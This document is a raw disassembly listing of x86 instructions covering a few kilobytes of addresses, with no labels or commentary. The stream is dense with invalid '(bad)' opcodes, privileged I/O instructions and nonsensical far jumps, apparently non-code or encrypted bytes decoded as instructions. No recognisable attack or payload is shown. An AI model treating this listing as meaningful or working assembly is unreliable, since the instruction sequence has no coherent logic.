  40c972:	cwde   
  40c973:	jbe    0x40c9b2
  40c975:	aam    0x9e
  40c977:	xchg   ebp,eax
  40c978:	and    al,0x89
  40c97a:	fwait
  40c97b:	push   ds
  40c97c:	mov    edi,0x36c48117
  40c981:	test   al,0x7f
  40c983:	jae    0x40c95e
  40c985:	lods   eax,DWORD PTR ds:[esi]
  40c986:	hlt    
  40c987:	xor    BYTE PTR [edi+0x5e],al
  40c98a:	mov    DWORD PTR [ecx-0x5c],ecx
  40c98d:	xchg   edi,eax
  40c98e:	mov    al,ds:0x48d34905
  40c993:	push   esi
  40c994:	and    BYTE PTR [edi-0x23],ch
  40c997:	hlt    
  40c998:	jne    0x40c98d
  40c99a:	daa    
  40c99b:	mov    ecx,0x8ba8cc59
  40c9a0:	sub    edx,DWORD PTR [edx+ebp*2]
  40c9a3:	push   ebx
  40c9a4:	rcl    ebp,1
  40c9a6:	adc    al,0xa5
  40c9a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9a9:	push   0x27
  40c9ab:	mov    dl,0x3a
  40c9ad:	jne    0x40c966
  40c9af:	jb     0x40c955
  40c9b1:	inc    ebp
  40c9b2:	pushf  
  40c9b3:	ins    BYTE PTR es:[edi],dx
  40c9b4:	sub    bl,bl
  40c9b6:	hlt    
  40c9b7:	aas    
  40c9b8:	mov    ds:0x16e20a88,al
  40c9bd:	sahf   
  40c9be:	mov    eax,ds:0xd3264175
  40c9c3:	push   ds
  40c9c4:	sub    edx,esp
  40c9c6:	jl     0x40c966
  40c9c8:	jmp    0x1cd2b7b1
  40c9cd:	xlat   BYTE PTR ds:[ebx]
  40c9ce:	loopne 0x40c968
  40c9d0:	mov    ebp,0x68d3a03d
  40c9d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d6:	sbb    DWORD PTR [edx+0x6f],ebx
  40c9d9:	sbb    bh,bh
  40c9db:	int3   
  40c9dc:	mov    ch,0x75
  40c9de:	stos   DWORD PTR es:[edi],eax
  40c9df:	out    0x0,eax
  40c9e1:	jp     0x40c999
  40c9e3:	mov    esi,0xb489ecc3
  40c9e8:	test   edx,0x534b7ea1
  40c9ee:	nop
  40c9ef:	cwde   
  40c9f0:	xor    ax,0xa00d
  40c9f4:	dec    edi
  40c9f5:	popa   
  40c9f6:	(bad)  
  40c9f7:	aaa    
  40c9f8:	or     edi,DWORD PTR [edx]
  40c9fa:	out    dx,eax
  40c9fb:	out    dx,al
  40c9fc:	xor    BYTE PTR [ebx+0x2ff00f0e],0x11
  40ca03:	mov    edi,0x663614ea
  40ca08:	xor    DWORD PTR [ebp+0x29],esp
  40ca0b:	sub    ah,BYTE PTR [esi+edi*2-0x318f0e2d]
  40ca12:	push   ebx
  40ca13:	test   eax,0x4680f242
  40ca18:	push   esp
  40ca19:	cmp    eax,0x952d2634
  40ca1e:	ins    DWORD PTR es:[edi],dx
  40ca1f:	imul   edi,edi,0x39b37c82
  40ca25:	pop    edx
  40ca26:	sbb    BYTE PTR [ecx-0x3ea274f9],bh
  40ca2c:	(bad)  
  40ca2d:	cld    
  40ca2e:	cmp    bl,ch
  40ca30:	popa   
  40ca31:	mov    dl,0xe1
  40ca33:	(bad)  
  40ca34:	sub    eax,0x1b26bb65
  40ca39:	ret    0x303b
  40ca3c:	scas   al,BYTE PTR es:[edi]
  40ca3d:	sub    eax,0x65ce84e2
  40ca42:	pop    edx
  40ca43:	ins    BYTE PTR es:[edi],dx
  40ca44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca45:	fdiv   QWORD PTR [ecx+0x7b]
  40ca48:	push   ebp
  40ca49:	sbb    bh,0xa7
  40ca4c:	rcr    bh,1
  40ca4e:	or     edx,DWORD PTR [esi+edi*8+0x30]
  40ca52:	ins    DWORD PTR es:[edi],dx
  40ca53:	and    al,0x4f
  40ca55:	sbb    ebx,ebp
  40ca57:	outs   dx,DWORD PTR ds:[esi]
  40ca58:	or     al,0x21
  40ca5a:	fidivr DWORD PTR [ecx*4-0x2167f1cd]
  40ca61:	daa    
  40ca62:	dec    esp
  40ca63:	pop    ebp
  40ca64:	cmp    DWORD PTR [ebx+0x41],0x50
  40ca68:	push   ss
  40ca69:	stc    
  40ca6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca6b:	and    ah,BYTE PTR [edi-0x43451e81]
  40ca71:	xchg   ebp,eax
  40ca72:	mov    DWORD PTR ds:0xdff45e3c,ebp
  40ca78:	sbb    DWORD PTR ds:0x59500dab,esi
  40ca7e:	call   0xc08bcba4
  40ca83:	pop    ds
  40ca84:	jmp    0x40cae0
  40ca86:	ss ret 
  40ca88:	test   BYTE PTR [esi+0x5c81a26d],0x22
  40ca8f:	mov    edi,0x2e80eec2
  40ca94:	add    DWORD PTR [edi+0x77],ecx
  40ca97:	je     0x40caab
  40ca99:	jg     0x40caff
  40ca9b:	gs xchg ecx,eax
  40ca9d:	jno    0x40ca63
  40ca9f:	xor    ch,bh
  40caa1:	enter  0x45d3,0xf6
  40caa5:	or     dh,ch
  40caa7:	es js  0x40caf4
  40caaa:	mov    eax,0x5819cb62
  40caaf:	inc    ebp
  40cab0:	cmp    BYTE PTR [ecx+0x87e719f],bl
  40cab6:	enter  0x7c5,0x86
  40caba:	lock cmc 
  40cabc:	jo     0x40cad3
  40cabe:	pop    ss
  40cabf:	xor    eax,0x4085395d
  40cac4:	retf   0xe1e6
  40cac7:	int3   
  40cac8:	push   ds
  40cac9:	adc    BYTE PTR [esi],dh
  40cacb:	mov    ch,0x9e
  40cacd:	inc    ebp
  40cace:	dec    eax
  40cacf:	mov    eax,ds:0xf69b174c
  40cad4:	sbb    BYTE PTR [esi],ch
  40cad6:	push   ecx
  40cad7:	sub    eax,0x734f94b7
  40cadc:	imul   ebx,DWORD PTR [edi],0x73
  40cadf:	mov    BYTE PTR [ecx-0x42],ch
  40cae2:	out    0xe2,eax
  40cae4:	sbb    BYTE PTR [edx*4+0x6cac984a],bh
  40caeb:	sbb    DWORD PTR [eax],ebp
  40caed:	cwde   
  40caee:	push   ebx
  40caef:	inc    ebx
  40caf0:	out    0x7c,eax
  40caf2:	jb     0x40cb35
  40caf4:	mov    edi,0x83e52d3a
  40caf9:	jbe    0x40caf1
  40cafb:	out    0x76,eax
  40cafd:	(bad)  
  40cafe:	mov    bh,0x86
  40cb00:	jb     0x40cb21
  40cb02:	mov    al,0xb2
  40cb04:	push   0xffffff92
  40cb06:	shl    BYTE PTR [edi-0x4d],cl
  40cb09:	aam    0xc2
  40cb0b:	xor    al,0xb
  40cb0d:	jnp    0x40cb70
  40cb0f:	add    BYTE PTR [eax+0x70940347],ch
  40cb15:	pop    ss
  40cb16:	xchg   ebx,eax
  40cb17:	ret    
  40cb18:	cmp    DWORD PTR [ebp+0x7de0e4bb],ecx
  40cb1e:	mov    edi,0xdbdc0594
  40cb23:	xor    dh,bl
  40cb25:	sbb    esp,DWORD PTR cs:[ecx-0x55402a16]
  40cb2c:	dec    esi
  40cb2d:	mov    al,ds:0xf478e85f
  40cb32:	push   esi
  40cb33:	cmp    DWORD PTR [eax+0x7f0c5363],esi
  40cb39:	xor    eax,0x966ffd19
  40cb3e:	add    esp,ebp
  40cb40:	retf   
  40cb41:	xor    al,0x5d
  40cb43:	fistp  QWORD PTR ds:0x878da290
  40cb49:	outs   dx,BYTE PTR ds:[esi]
  40cb4a:	xor    eax,0x9ccedd32
  40cb4f:	pop    ss
  40cb50:	sub    dh,cl
  40cb52:	test   eax,0xc152ca76
  40cb57:	mov    DWORD PTR [ecx],eax
  40cb59:	mov    BYTE PTR [eax-0x2a6d346c],ah
  40cb5f:	push   cs
  40cb60:	or     al,0x31
  40cb62:	adc    ah,BYTE PTR [edx-0x1b]
  40cb65:	pop    es
  40cb66:	mov    esp,0x9625c960
  40cb6b:	icebp  
  40cb6c:	(bad)  
  40cb6d:	out    dx,eax
  40cb6e:	mov    cl,BYTE PTR [esi]
  40cb70:	or     bl,BYTE PTR [edi+0x5b4477d6]
  40cb76:	(bad)  
  40cb77:	adc    eax,0xe334a776
  40cb7c:	scas   eax,DWORD PTR es:[edi]
  40cb7d:	add    ch,BYTE PTR ds:0x39047cbf
  40cb83:	add    dl,bl
  40cb85:	adc    BYTE PTR ds:0x7dbcfc9c,bl
  40cb8b:	fcom   st(6)
  40cb8d:	aad    0xa0
  40cb8f:	sbb    BYTE PTR [ebp+edi*2-0x19c80a8c],ch
  40cb96:	sbb    al,0x49
  40cb98:	nop
  40cb99:	or     eax,edx
  40cb9b:	jo     0x40cb9d
  40cb9d:	or     eax,0xea8e1136
  40cba2:	sub    esp,DWORD PTR [edi-0x3db1b349]
  40cba8:	addr16 push ss
  40cbaa:	inc    ecx
  40cbab:	inc    esp
  40cbac:	pop    ecx
  40cbad:	inc    ecx
  40cbae:	push   cs
  40cbaf:	or     ebp,DWORD PTR [edi+0x5ce2aca8]
  40cbb5:	lea    ebp,[eax-0x16]
  40cbb8:	inc    edi
  40cbb9:	pop    eax
  40cbba:	pushf  
  40cbbb:	jecxz  0x40cb8f
  40cbbd:	setle  BYTE PTR [ecx]
  40cbc0:	into   
  40cbc1:	inc    eax
  40cbc2:	iret   
  40cbc3:	xchg   ebx,eax
  40cbc4:	in     eax,dx
  40cbc5:	inc    esp
  40cbc6:	xchg   BYTE PTR [eax],dh
  40cbc8:	jg     0x40cb9c
  40cbca:	or     DWORD PTR [esi-0x7bea20e6],edx
  40cbd0:	mov    edx,0x63353ca7
  40cbd5:	sti    
  40cbd6:	push   ss
  40cbd7:	aam    0x4
  40cbd9:	out    dx,eax
  40cbda:	fwait
  40cbdb:	js     0x40cc44
  40cbdd:	dec    edi
  40cbde:	xchg   edi,eax
  40cbdf:	xlat   BYTE PTR ds:[ebx]
  40cbe0:	loopne 0x40cc36
  40cbe2:	lods   al,BYTE PTR ds:[esi]
  40cbe3:	cli    
  40cbe4:	lahf   
  40cbe5:	sti    
  40cbe6:	cmp    BYTE PTR [edi-0x330b12a4],al
  40cbec:	or     DWORD PTR [edi],ecx
  40cbee:	test   eax,0x656ff94d
  40cbf3:	xchg   edi,eax
  40cbf4:	scas   eax,DWORD PTR es:[edi]
  40cbf5:	add    ah,dl
  40cbf7:	call   0x51f7:0x680098c6
  40cbfe:	out    dx,al
  40cbff:	adc    ah,ch
  40cc01:	jnp    0x40cbd8
  40cc03:	les    esi,FWORD PTR [edx+0xa837e82]
  40cc09:	xlat   BYTE PTR ds:[ebx]
  40cc0a:	dec    edx
  40cc0b:	shl    DWORD PTR ds:0x9030083e,cl
  40cc11:	test   al,dl
  40cc13:	or     al,bh
  40cc15:	or     edx,DWORD PTR [ebp+0x49226060]
  40cc1b:	(bad)  
  40cc1c:	sbb    bh,BYTE PTR [ecx-0x78]
  40cc1f:	test   BYTE PTR [esi+0x71],0x33
  40cc23:	pop    edx
  40cc24:	lods   eax,DWORD PTR ds:[esi]
  40cc25:	mov    WORD PTR [ebx+0x22],es
  40cc28:	sbb    ebx,eax
  40cc2a:	push   ebp
  40cc2b:	dec    ebx
  40cc2c:	push   esp
  40cc2d:	outs   dx,DWORD PTR ds:[esi]
  40cc2e:	fisttp WORD PTR [ebx+edx*4+0x302e4a29]
  40cc35:	sbb    BYTE PTR [edi-0x3b80216d],dh
  40cc3b:	mov    esi,0xb98ced5d
  40cc40:	ins    BYTE PTR es:[edi],dx
  40cc41:	in     al,0xf8
  40cc43:	sar    DWORD PTR [ebx-0x1a],cl
  40cc46:	fld    QWORD PTR [edx]
  40cc48:	cwde   
  40cc49:	inc    ecx
  40cc4a:	rol    DWORD PTR [esi],cl
  40cc4c:	or     eax,0x769c76ab
  40cc51:	pop    edx
  40cc52:	mov    bh,BYTE PTR [ebp-0x7b01d9ee]
  40cc58:	mov    ?,WORD PTR [edx-0x6141d997]
  40cc5e:	jae    0x40cc79
  40cc60:	sar    DWORD PTR [esi+0x65],1
  40cc63:	xchg   esi,eax
  40cc64:	out    0xcf,eax
  40cc66:	add    eax,0x182aa875
  40cc6b:	push   edi
  40cc6c:	adc    ch,BYTE PTR [edi+0x53643868]
  40cc72:	cli    
  40cc73:	test   BYTE PTR [edx-0x5d194b62],dl
  40cc79:	mov    al,ds:0x2cf40cc6
  40cc7e:	daa    
  40cc7f:	pop    edx
  40cc80:	cmp    BYTE PTR [ebp+0x1394f8cc],0x7e
  40cc87:	or     DWORD PTR [ebx-0x27d4423e],edi
  40cc8d:	cdq    
  40cc8e:	sub    eax,0x334e1477
  40cc93:	lds    esp,FWORD PTR [edx]
  40cc95:	pop    ecx
  40cc96:	aaa    
  40cc97:	(bad)  
  40cc98:	popf   
  40cc99:	icebp  
  40cc9a:	aaa    
  40cc9b:	mov    ecx,0xdf3d75f5
  40cca0:	adc    cl,0x10
  40cca3:	aam    0x54
  40cca5:	hlt    
  40cca6:	outs   dx,DWORD PTR ds:[esi]
  40cca7:	adc    al,0xd5
  40cca9:	add    ebp,DWORD PTR [esi-0x5b]
  40ccac:	mov    dl,0x1d
  40ccae:	into   
  40ccaf:	fcomp  QWORD PTR [esi+0x6bbfc8a6]
  40ccb5:	ins    BYTE PTR es:[edi],dx
  40ccb6:	mov    BYTE PTR [edx-0x38],dh
  40ccb9:	pop    ss
  40ccba:	aam    0xeb
  40ccbc:	xchg   ecx,eax
  40ccbd:	mov    esi,DWORD PTR [ecx+edi*2+0x4fa3fb14]
  40ccc4:	outs   dx,BYTE PTR ds:[esi]
  40ccc5:	js     0x40cccc
  40ccc7:	add    esi,DWORD PTR [edx]
  40ccc9:	xchg   ebp,eax
  40ccca:	int3   
  40cccb:	call   0x4515:0x94f1ef8d
  40ccd2:	pop    eax
  40ccd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ccd4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccd5:	mov    bh,0x5f
  40ccd7:	mov    esp,0xa0d1c9d2
  40ccdc:	xor    DWORD PTR [edi+0x3f],0x2e
  40cce0:	inc    edx
  40cce1:	lea    esp,[ebx-0x6c1ea2ee]
  40cce7:	out    0x90,al
  40cce9:	mov    edx,0xe3b569d4
  40ccee:	push   ecx
  40ccef:	icebp  
  40ccf0:	or     bl,BYTE PTR [eax+0x5ea94498]
  40ccf6:	push   esi
  40ccf7:	cmp    eax,0x25cee3cc
  40ccfc:	inc    sp
  40ccfe:	xor    DWORD PTR ds:0x1462f25d,ebx
  40cd04:	enter  0xda0e,0xbe
  40cd08:	inc    ebx
  40cd09:	mov    esp,0x2729ada8
  40cd0e:	pop    eax
  40cd0f:	jl     0x40ccb1
  40cd11:	jge    0x40ccf8
  40cd13:	dec    esi
  40cd14:	mov    dh,0x62
  40cd16:	mov    edx,0x1f48ddbc
  40cd1b:	mov    esp,0x1bb83f9e
  40cd20:	sbb    bl,0x31
  40cd23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd24:	dec    ebp
  40cd25:	into   
  40cd26:	mov    bh,0xce
  40cd28:	pop    ds
  40cd29:	pop    ds
  40cd2a:	pushf  
  40cd2b:	push   ecx
  40cd2c:	outs   dx,BYTE PTR ds:[esi]
  40cd2d:	jno    0x40ccda
  40cd2f:	je     0x40ccff
  40cd31:	and    bl,BYTE PTR [esi+0x81299b6]
  40cd37:	and    bh,BYTE PTR [eax]
  40cd39:	es clc 
  40cd3b:	call   0xefcf0a7b
  40cd40:	psllq  mm4,QWORD PTR [edi-0x79]
  40cd44:	mov    eax,0x59725452
  40cd49:	push   ecx
  40cd4a:	sbb    ebp,DWORD PTR [edi-0x8]
  40cd4d:	mov    edx,0x6eab1ec
  40cd52:	sub    eax,0x1442b35a
  40cd57:	stos   DWORD PTR es:[edi],eax
  40cd58:	push   eax
  40cd59:	sahf   
  40cd5a:	nop
  40cd5b:	xchg   ebx,eax
  40cd5c:	leave  
  40cd5d:	or     DWORD PTR [ebp+0x244a4e1c],ebx
  40cd63:	sub    BYTE PTR [ecx],ah
  40cd65:	std    
  40cd66:	push   ebp
  40cd67:	fidiv  DWORD PTR [edx-0xcf54ca7]
  40cd6d:	mul    dl
  40cd6f:	cmp    eax,0xba2edd9c
  40cd74:	dec    ecx
  40cd75:	sub    eax,0x6a2234f4
  40cd7a:	scas   al,BYTE PTR es:[edi]
  40cd7b:	mov    eax,ds:0x3bd9a414
  40cd80:	aam    0x91
  40cd82:	lds    esi,FWORD PTR [ebx-0x40366017]
  40cd88:	push   ebx
  40cd89:	out    0xea,al
  40cd8b:	iret   
  40cd8c:	outs   dx,DWORD PTR ds:[esi]
  40cd8d:	sti    
  40cd8e:	sub    ebx,DWORD PTR [ecx+0xb3630ad]
  40cd94:	jae    0x40cdb0
  40cd96:	out    dx,eax
  40cd97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd98:	inc    esi
  40cd99:	ror    DWORD PTR [edi+0x4c],1
  40cd9c:	add    esp,DWORD PTR [ebx+edx*4-0x64f24d0a]
  40cda3:	sbb    eax,0x54517a6b
  40cda8:	shl    DWORD PTR [esi+0x31055f55],0xf1
  40cdaf:	dec    edx
  40cdb0:	sahf   
  40cdb1:	ss stos DWORD PTR es:[edi],eax
  40cdb3:	inc    ecx
  40cdb4:	sub    ch,dl
  40cdb6:	fcmovnu st,st(1)
  40cdb8:	sbb    al,0x77
  40cdba:	out    dx,eax
  40cdbb:	mov    ch,0x3d
  40cdbd:	dec    eax
  40cdbe:	add    DWORD PTR [ebp+0x51],edi
  40cdc1:	sub    ebp,ebx
  40cdc3:	out    0xe9,al
  40cdc5:	bnd jg 0x40ce02
  40cdc8:	es (bad) 
  40cdca:	adc    eax,0xf9d3e7ab
  40cdcf:	push   cs
  40cdd0:	jle    0x40cd72
  40cdd2:	sub    dl,BYTE PTR [ebp-0x22]
  40cdd5:	push   es
  40cdd6:	inc    ecx
  40cdd7:	inc    edx
  40cdd8:	jnp    0x40ce05
  40cdda:	cmp    ecx,DWORD PTR [eax-0x6d]
  40cddd:	mov    edi,0x121215eb
  40cde2:	(bad)  
  40cde4:	mov    DWORD PTR [ebx-0x5912f053],0xb645497a
  40cdee:	mov    dh,0x33
  40cdf0:	cmp    edi,DWORD PTR [ebp+0x25]
  40cdf3:	(bad)  
  40cdf4:	inc    esi
  40cdf5:	push   ebx
  40cdf6:	adc    al,0xa2
  40cdf8:	add    DWORD PTR ds:[ebp+0x6a8c74da],0xfffffffc
  40ce00:	imul   edi,DWORD PTR [eax-0x3f],0xffffffa4
  40ce04:	out    dx,eax
  40ce05:	sub    al,0xf1
  40ce07:	(bad)  
  40ce09:	adc    eax,0xb7b8d30e
  40ce0e:	mov    al,0xa3
  40ce10:	jl     0x40cdd0
  40ce12:	lods   eax,DWORD PTR ds:[esi]
  40ce13:	pusha  
  40ce14:	in     al,dx
  40ce15:	sub    BYTE PTR ds:0x8170953,al
  40ce1b:	mov    ch,al
  40ce1d:	pop    ds
  40ce1e:	push   ecx
  40ce1f:	jns    0x40ce3f
  40ce21:	push   es
  40ce22:	mov    edi,0x3a2c2f41
  40ce27:	and    eax,DWORD PTR [edi-0x7bfd09a0]
  40ce2d:	mov    dl,BYTE PTR [eax]
  40ce2f:	fmul   QWORD PTR [ebp-0x54]
  40ce32:	and    eax,0x743bd3e5
  40ce37:	ret    
  40ce38:	cdq    
  40ce39:	jb     0x40cde5
  40ce3b:	out    dx,al
  40ce3c:	jbe    0x40ce2e
  40ce3e:	daa    
  40ce3f:	push   cs
  40ce40:	mov    dh,0xed
  40ce42:	les    ecx,FWORD PTR [edx+0x79bf1a9e]
  40ce48:	dec    edx
  40ce49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce4a:	shl    BYTE PTR [ebx+0x14],cl
  40ce4d:	push   esi
  40ce4e:	xchg   edx,eax
  40ce4f:	popf   
  40ce50:	adc    BYTE PTR [edi-0x12],0xea
  40ce54:	test   DWORD PTR [ebx-0x2887d125],0x2d30afff
  40ce5e:	and    al,0x1e
  40ce60:	mov    eax,0x4cfee531
  40ce65:	ins    BYTE PTR es:[edi],dx
  40ce66:	cdq    
  40ce67:	in     eax,dx
  40ce68:	add    DWORD PTR [ecx],0x7d
  40ce6b:	cld    
  40ce6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce6d:	shr    BYTE PTR [esi-0x35902bd4],0xfc
  40ce74:	and    cl,bl
  40ce76:	sbb    ah,ah
  40ce78:	push   cs
  40ce79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce7a:	stos   DWORD PTR es:[edi],eax
  40ce7b:	les    eax,FWORD PTR [ecx+0x79f246a3]
  40ce81:	lods   al,BYTE PTR ds:[esi]
  40ce82:	jmp    0x8e75:0x55df3103
  40ce89:	mov    edx,0x1616921a
  40ce8e:	(bad)  
  40ce8f:	repnz xor al,0xec
  40ce92:	repnz lahf 
  40ce94:	in     eax,0x3f
  40ce96:	jmp    0x40ce6f
  40ce98:	cmp    bh,bh
  40ce9a:	std    
  40ce9b:	mov    esi,0x242027ad
  40cea0:	xor    esp,DWORD PTR [edi-0x6c]
  40cea3:	bound  ebx,QWORD PTR [edi+ebx*8-0x11]
  40cea7:	pop    edx
  40cea8:	add    eax,0x78dc61fd
  40cead:	mov    ah,0xd0
  40ceaf:	jle    0x40cece
  40ceb1:	cmp    eax,0x73e59f
  40ceb6:	cmc    
  40ceb7:	hlt    
  40ceb8:	pushf  
  40ceb9:	int    0x6c
  40cebb:	sub    al,bl
  40cebd:	icebp  
  40cebe:	bts    DWORD PTR [eax],eax
  40cec1:	ds leave 
  40cec3:	push   cs
  40cec4:	xchg   DWORD PTR [eax+0x7c],ebp
  40cec7:	aaa    
  40cec8:	pop    ds
  40cec9:	inc    esp
  40ceca:	mov    ds:0xfb9a2861,eax
  40cecf:	pop    esi
  40ced0:	ss inc ebp
  40ced2:	fdivr  QWORD PTR [edx]
  40ced4:	loopne 0x40cf20
  40ced6:	jp     0x40cea7
  40ced8:	pop    ebx
  40ced9:	cmp    esp,DWORD PTR [ecx]
  40cedb:	test   eax,eax
  40cedd:	xlat   BYTE PTR ds:[ebx]
  40cede:	das    
  40cedf:	test   eax,0x1130df44
  40cee4:	adc    eax,0xf0367389
  40cee9:	out    0x6e,al
  40ceeb:	(bad)  
  40ceec:	stos   DWORD PTR es:[edi],eax
  40ceed:	arpl   WORD PTR [edi+ebp*8-0x52],bp
  40cef1:	mov    ds:0x4326334e,al
  40cef6:	xchg   edx,eax
  40cef7:	pop    ecx
  40cef8:	lods   al,BYTE PTR ds:[esi]
  40cef9:	ja     0x40cedc
  40cefb:	(bad)  
  40cefd:	sbb    edi,edi
  40ceff:	xchg   DWORD PTR [edi-0x41],esp
  40cf02:	dec    esi
  40cf03:	inc    edx
  40cf04:	in     eax,0x48
  40cf06:	fisttp QWORD PTR [ebx-0x4b43fe6d]
  40cf0c:	jp     0x40ced8
  40cf0e:	inc    eax
  40cf0f:	shr    DWORD PTR [esi],1
  40cf11:	lahf   
  40cf12:	sub    eax,0x1824c661
  40cf17:	push   eax
  40cf18:	das    
  40cf19:	xchg   edx,eax
  40cf1a:	jbe    0x40ceec
  40cf1c:	pop    ebx
  40cf1d:	sbb    al,0x30
  40cf1f:	bound  ebx,QWORD PTR cs:[edx+0x517cd560]
  40cf26:	xchg   esp,eax
  40cf27:	mov    esp,0xb28395a9
  40cf2c:	fsub   st(4),st
  40cf2e:	cmp    eax,0x8882b704
  40cf33:	xlat   BYTE PTR ds:[ebx]
  40cf34:	mov    ebx,DWORD PTR [ebx+0x3b5c0121]
  40cf3a:	mov    esp,0x4260fc51
  40cf3f:	sub    eax,0x3a4e54d5
  40cf44:	xchg   ecx,eax
  40cf45:	and    BYTE PTR [ecx],ch
  40cf47:	jge    0x40cf17
  40cf49:	in     al,0xff
  40cf4b:	sub    edi,edx
  40cf4d:	adc    eax,DWORD PTR [bx-0x7d]
  40cf51:	push   es
  40cf52:	arpl   WORD PTR [eax],ax
  40cf54:	arpl   WORD PTR [edi+ebp*1+0x6],bx
  40cf58:	(bad)  
  40cf59:	and    ah,BYTE PTR [ebp+0xde702]
  40cf5f:	or     eax,0xe55b6399
  40cf64:	push   ss
  40cf65:	inc    edx
  40cf66:	xchg   BYTE PTR [eax+0x2f],ah
  40cf69:	adc    bl,bl
  40cf6b:	cdq    
  40cf6c:	dec    esp
  40cf6d:	sbb    edi,DWORD PTR [edi]
  40cf6f:	pop    DWORD PTR [edx+0x1b]
  40cf72:	imul   eax,DWORD PTR es:[edi+0x15],0x6abc3c3f
  40cf7a:	and    ecx,DWORD PTR [edi]
  40cf7c:	mov    ch,0xda
  40cf7e:	adc    DWORD PTR [ecx+0x7],esi
  40cf81:	push   es
  40cf82:	or     bh,BYTE PTR [ebp+ebp*4-0x6fccc4d5]
  40cf89:	xchg   edi,eax
  40cf8a:	mov    esi,0x17317a8a
  40cf8f:	cmp    eax,0xad20c72c
  40cf94:	sub    ah,dl
  40cf96:	jge    0x40cf34
  40cf98:	hlt    
  40cf99:	fnsave ds:0xc99df34b
  40cf9f:	or     eax,0x2726b68
  40cfa4:	scas   al,BYTE PTR es:[edi]
  40cfa5:	leave  
  40cfa6:	and    eax,0xc82e0d5c
  40cfab:	inc    eax
  40cfac:	aad    0xf6
  40cfae:	in     al,dx
  40cfaf:	add    al,0xd5
  40cfb1:	stos   WORD PTR es:[edi],ax
  40cfb3:	and    eax,DWORD PTR [edx]
  40cfb5:	retf   
  40cfb6:	ins    DWORD PTR es:[edi],dx
  40cfb7:	fucomi st,st(0)
  40cfb9:	mov    dl,BYTE PTR [ecx+0x13941487]
  40cfbf:	mov    esp,0x32dad9c3
  40cfc4:	push   0x9725cd68
  40cfc9:	mov    ah,0x19
  40cfcb:	inc    esp
  40cfcc:	ins    DWORD PTR es:[edi],dx
  40cfcd:	adc    dl,bh
  40cfcf:	add    bl,BYTE PTR [edi-0x4c61822c]
  40cfd5:	out    0xdb,eax
  40cfd7:	or     DWORD PTR [ebx],ebx
  40cfd9:	jmp    0x309fe193
  40cfde:	mov    ebx,0x8bb0b298
  40cfe3:	fidiv  DWORD PTR [esi-0x1ef79e7a]
  40cfe9:	xchg   cl,bh
  40cfeb:	mov    DWORD PTR [ecx+eiz*1+0x62d54806],edx
  40cff2:	cmp    edx,DWORD PTR [edx]
  40cff4:	cmp    dh,bl
  40cff6:	ins    BYTE PTR es:[edi],dx
  40cff7:	and    cl,BYTE PTR [ebx]
  40cff9:	test   BYTE PTR [edx-0x4a],bl
  40cffc:	ss out 0xf1,al
  40cfff:	inc    ebx
  40d000:	inc    ebp
  40d001:	mov    ch,0x91
  40d003:	or     al,0xbf
  40d005:	imul   DWORD PTR [edx-0x42c211df]
  40d00b:	dec    ecx
  40d00c:	stos   DWORD PTR es:[edi],eax
  40d00d:	lods   eax,DWORD PTR ds:[esi]
  40d00e:	mov    dl,0x4e
  40d010:	inc    esp
  40d011:	mov    esp,0xbd143297
  40d016:	sub    ah,dl
  40d018:	push   esi
  40d019:	les    ebp,FWORD PTR [edx+0x66]
  40d01c:	repnz cmp BYTE PTR [edi+0x6310a7cf],al
  40d023:	adc    al,0xbf
  40d025:	dec    ecx
  40d026:	gs gs pop esp
  40d029:	push   edi
  40d02a:	icebp  
  40d02b:	sbb    ecx,DWORD PTR [eax]
  40d02d:	push   ds
  40d02e:	mov    ah,0x1a
  40d030:	fst    QWORD PTR [ebx-0x44]
  40d033:	mov    ch,bh
  40d035:	test   al,0x5a
  40d037:	in     al,dx
  40d038:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d039:	repz and edx,DWORD PTR [esi]
  40d03c:	mov    ecx,0xaede1e05
  40d041:	push   es
  40d042:	cdq    
  40d043:	cmp    BYTE PTR [ebx+edi*2],cl
  40d046:	push   0xbf668926
  40d04b:	das    
  40d04c:	xchg   ecx,eax
  40d04d:	pop    ebp
  40d04e:	aam    0x7d
  40d050:	test   ecx,ebp
  40d052:	pop    ecx
  40d053:	shl    BYTE PTR ds:0x1b26ddda,0xb4
  40d05a:	push   ecx
  40d05b:	enter  0x97d0,0x8
  40d05f:	xor    esi,DWORD PTR [eax+0x8]
  40d062:	inc    esp
  40d063:	pushf  
  40d064:	pop    edx
  40d065:	in     al,dx
  40d066:	neg    ah
  40d068:	mov    ds:0x8cfce41f,al
  40d06d:	mov    cl,0xc2
  40d06f:	dec    ecx
  40d070:	sti    
  40d071:	cwde   
  40d072:	pusha  
  40d073:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d074:	dec    eax
  40d075:	rol    BYTE PTR [esi-0xf],1
  40d078:	pop    ebx
  40d079:	les    edi,FWORD PTR ds:0xd108012d
  40d07f:	mov    ss,WORD PTR [eax+esi*2-0x6d27426f]
  40d086:	retf   0x491a
  40d089:	retf   
  40d08a:	(bad)  
  40d08b:	and    eax,0x879ec733
  40d090:	pop    ebp
  40d091:	dec    esp
  40d092:	push   edx
  40d093:	cli    
  40d094:	xor    DWORD PTR [edi+0x60],ecx
  40d097:	and    ebx,DWORD PTR [ebx+0xa]
  40d09a:	inc    edi
  40d09b:	push   es
  40d09c:	call   0xfc35817
  40d0a1:	cmp    ah,BYTE PTR cs:[edx-0x565bbdc8]
  40d0a8:	fwait
  40d0a9:	xchg   edx,eax
  40d0aa:	mov    esi,0xfcc6029c
  40d0af:	push   ebx
  40d0b0:	inc    edx
  40d0b1:	pop    ecx
  40d0b2:	mov    edi,es
  40d0b4:	jmp    0x40d07c
  40d0b6:	mov    cl,0xeb
  40d0b8:	mov    eax,ds:0x68ed9723
  40d0bd:	scas   eax,DWORD PTR es:[edi]
  40d0be:	adc    BYTE PTR [ebx-0x265c7b43],0xef
  40d0c5:	sub    al,0x49
  40d0c7:	(bad)  
